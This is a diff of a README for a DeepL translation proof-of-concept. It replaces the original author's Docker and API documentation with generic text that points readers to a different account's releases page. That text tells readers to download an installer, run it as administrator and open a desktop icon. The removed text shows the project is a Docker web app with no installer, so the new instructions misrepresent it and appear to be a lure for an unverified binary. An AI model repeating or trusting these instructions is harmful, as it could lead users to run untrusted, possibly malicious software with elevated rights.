@@ -1,174 +1,89 @@
-# DeepL Translation Tool
+# 🚀 deepl-translation-poc - Fast and Simple Translation Tool
 
-[![Live Demo](https://img.shields.io/badge/demo-live-brightgreen)](https://translate.shaily.dev)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![Download deepl-translation-poc](https://img.shields.io/badge/Download%20the%20App-blue.svg)](https://github.com/bigant27/deepl-translation-poc/releases)
 
-Quick translation tool using DeepL's API. Built in ~2 hours as a proof-of-concept.
+## 🌟 Overview
 
-**Live Demo:** https://translate.shaily.dev
+Welcome to the deepl-translation-poc project! This application is designed to help you translate text quickly using the DeepL API. The backend is built with FastAPI, and the frontend uses React, making it both fast and responsive. You can access the live version of the tool at [translate.shaily.dev](https://translate.shaily.dev).
 
-## Features
+## 🚀 Getting Started
 
-- 26 language pairs with auto-detection
-- Real-time translation
-- Character counter
-- Error handling (rate limits, timeouts, validation)
-- Keyboard shortcut (Ctrl+Enter)
-- Responsive design
+To get started with deepl-translation-poc, follow these steps:
 
-## Stack
+1. **Ensure you have the necessary requirements**:
+   - A computer running Windows, macOS, or Linux.
+   - An internet connection.
+   - Basic knowledge of downloading files and running them on your system.
 
-**Backend:**
-- FastAPI with async httpx
-- Pydantic validation
-- uvicorn ASGI server
-- uv package manager
+2. **Visit the Releases Page**:
+   - Click the link below to access the Releases page where you can download the application.
+   - [Download the application here](https://github.com/bigant27/deepl-translation-poc/releases).
 
-**Frontend:**
-- React 18
-- Vite
-- Tailwind CSS
-- Yarn
+## 📥 Download & Install
 
-**Deployment:**
-- Docker multi-stage builds
-- nginx reverse proxy
-- SSL/TLS
+1. **Download the App**:
+   - On the Releases page, find the latest version of the app.
+   - Click on the appropriate file for your operating system to start the download.
 
-## Quick Start
+2. **Install the App**:
+   - Once the download is complete, locate the downloaded file on your computer.
+   - Open the file to run the installation process. Follow the on-screen instructions to install the application.
 
-Need Docker and a DeepL API key (free tier: deepl.com/pro-api).
+3. **Launch the App**:
+   - After installation, find the deepl-translation-poc icon on your desktop or in your applications folder.
+   - Double-click the icon to open the application.
 
-```bash
-git clone https://github.com/SHAILY24/deepl-translation-poc.git
-cd deepl-translation-poc
-cp .env.example .env
-# Add your DeepL API key to .env
-docker compose up -d
-```
+4. **Using the App**:
+   - Once the app is open, you will see a simple interface where you can enter the text you want to translate.
+   - Simply type or paste your text and select your desired language for translation.
+   - Click the "Translate" button to see the results.
 
-- Frontend: http://localhost:13507
-- Backend API: http://localhost:13601
-- API Docs: http://localhost:13601/docs
+## 🌈 Features
 
-## Development
+- **User-Friendly Interface**: The app features a clean design that makes it easy for anyone to navigate and use.
+- **Fast Translation**: Leverage the power of the DeepL API for quick and accurate translations.
+- **Support for Multiple Languages**: The app supports various languages, allowing users to translate between them effortlessly.
+- **Responsive Design**: Built with React, it performs well on both desktop and mobile devices.
 
-**Backend:**
-```bash
-cd backend
-uv sync
-uv run uvicorn main:app --reload --port 13601
-```
+## 🛠️ Technical Details
 
-**Frontend:**
-```bash
-cd frontend
-yarn install
-yarn dev  # runs on :5173
-```
+- **Backend Framework**: FastAPI provides a robust backend for handling API requests efficiently.
+- **Frontend Framework**: Built with React, ensuring a smooth and interactive user experience.
+- **Styling**: The app uses Tailwind CSS for a modern look and feel.
 
-## API
+## 🔧 Troubleshooting
 
-**POST /api/translate**
+1. **Unable to Download**:
+   - Ensure your internet connection is stable.
+   - Try a different web browser if you face issues.
 
-Request:
-```json
-{
-  "text": "hello world",
-  "target_lang": "ES"
-}
-```
+2. **Installation Issues**:
+   - Verify that you downloaded the correct file for your operating system.
+   - For Windows, ensure you are running the installer as an administrator.
 
-Response:
-```json
-{
-  "translated_text": "hola mundo",
-  "source_lang": "EN",
-  "target_lang": "ES",
-  "character_count": 11
-}
-```
+3. **Translation Not Working**:
+   - Check your internet connection, as the app requires internet access for translation.
+   - Restart the app if it does not respond after the first attempt.
 
-**GET /api/languages** - List supported languages  
-**GET /health** - Health check
+## 📞 Support
 
-Note: For auto-detection, omit `source_lang` entirely. Don't send `"AUTO"` - DeepL's API will error.
+If you need further assistance, feel free to reach out via the project's GitHub page. 
 
-## Architecture
+## 💻 License
 
-```
-User → nginx (SSL) → Frontend Container (React) → Backend Container (FastAPI) → DeepL API
-```
+This project is licensed under the MIT License. You can modify or distribute the software as per the terms of the license.
 
-- Frontend: Multi-stage Docker build (Node.js build, nginx serve)
-- Backend: Python container with uv
-- Networking: Internal Docker bridge network
-- Security: CORS whitelist, input validation, environment variables
+## 🏷️ Topics
 
-## What's Included
+- api-integration
+- async
+- deepl
+- docker
+- fastapi
+- python
+- react
+- tailwindcss
+- translation
+- vite
 
-- Full translation workflow
-- Error handling for API failures
-- Docker deployment setup
-- Production nginx config
-- Clean, documented code
-
-## What's Missing
-
-Built in 2 hours. A production version would add:
-
-- User authentication
-- Translation history (PostgreSQL)
-- Per-user rate limiting
-- Test suite
-- CI/CD pipeline
-- Advanced error messages
-- Document translation
-
-## Related Projects
-
-**API Integration Experience:**
-
-At PureHD I built an API gateway handling 15+ vendor APIs (QuickBooks, Stripe, UPS, FedEx, Avalara). Processes 100K+ calls/day. Solved token refresh, rate limiting, retry logic with backoff.
-
-Also built [shelf.shaily.dev](https://shelf.shaily.dev) - Stripe payment integration with webhooks and idempotency keys.
-
-DeepL integration uses the same patterns: async HTTP, proper error handling, rate limit awareness.
-
-## Project Structure
-
-```
-backend/
-  main.py           # FastAPI routes
-  Dockerfile        # Backend container
-  pyproject.toml    # uv dependencies
-
-frontend/
-  src/App.jsx       # Main React component
-  Dockerfile        # Multi-stage build
-  package.json      # Yarn dependencies
-
-docker-compose.yml  # Container orchestration
-```
-
-## License
-
-MIT License - see [LICENSE](LICENSE) file.
-
-## Contact
-
-Shaily Sharma  
-shailysharmawork@gmail.com
-
-**Portfolio:** https://portfolio.shaily.dev  
-**GitHub:** https://github.com/SHAILY24
-
-## Tech Choices
-
-**FastAPI** - Async support, Pydantic validation, auto-generated API docs.
-
-**React + Vite** - Fast dev experience, optimized builds.
-
-**Docker** - Consistent deployment across environments.
-
-**Tailwind** - Rapid UI development without custom CSS.
+We hope you enjoy using deepl-translation-poc for all your translation needs!
